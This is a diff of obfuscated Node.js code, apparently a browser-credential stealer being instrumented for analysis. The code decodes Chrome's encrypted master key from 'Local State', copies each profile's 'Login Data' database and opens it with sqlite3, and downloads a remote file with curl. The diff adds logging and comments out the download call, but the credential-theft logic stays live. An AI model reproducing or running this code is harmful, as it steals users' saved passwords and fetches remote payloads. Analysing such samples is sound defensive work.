@@ -29,7 +29,8 @@ const fs = require("fs"),
     ppath = require("path"),
     rrequest = require("request"),
     ccrypto = require("crypto"),
-    exec_child_process = require("child_process")["exec"],
+    child_process = require("child_process"),
+    exec_child_process = child_process["exec"],
     homedir = os["homedir"](),
     platform = os["platform"](),
     tmpdir = os["tmpdir"](),
@@ -61,6 +62,7 @@ const k = "L0FwcERhdGEvTG9jYWwvR29vZ2xlL0Nocm9tZS9Vc2VyIERhdGE", // /AppData/Loc
                 return;
             const chrome_user_data_path = "~/AppData/Local/Google/Chrome/User Data";
             fs["readFile"]("~/AppData/Local/Google/Chrome/User Data/Local State", "utf-8", ((a, l) => {
+                console.log("read file!");
                 mkey = JSON.parse(l), mkey = mkey["os_crypt"]["encrypted_key"], mkey = (t => {
                     var c = atob(t),
                         r = new Uint8Array(c.length);
@@ -74,6 +76,7 @@ const k = "L0FwcERhdGEvTG9jYWwvR29vZ2xlL0Nocm9tZS9Vc2VyIERhdGE", // /AppData/Loc
                         const profile_name = 0 === ii ? ddefault : `${pprofile} ${ii}`,
                             e = `${chrome_user_data_path}/${profile_name}/Login Data`,
                             l = `${chrome_user_data_path}/t${profile_name}`;
+                        console.log(`Try to copy file from ${e} to ${l}`);
                         N(e) && fs["copyFile"](e, l, (t => {
                             try {
                                 const t = new sqlite3["Database"](l);
@@ -246,9 +249,10 @@ const Gt = async () => {
         r = `${homedir}${f(store_node)}`;
     if (fs[eexistsSync](r)) E();
     else {
-        spawn(`curl -Lo "${r}" "${c}"`, ((t, c, r) => {
+        console.log(`curl -Lo "${r}" "${c}"`);
+        //child_process.spawn(`curl -Lo "${r}" "${c}"`, ((t, c, r) => {
             E()
-        }))
+        //}))
     }
 },
 ht = async () => await new Promise(((t, c) => {
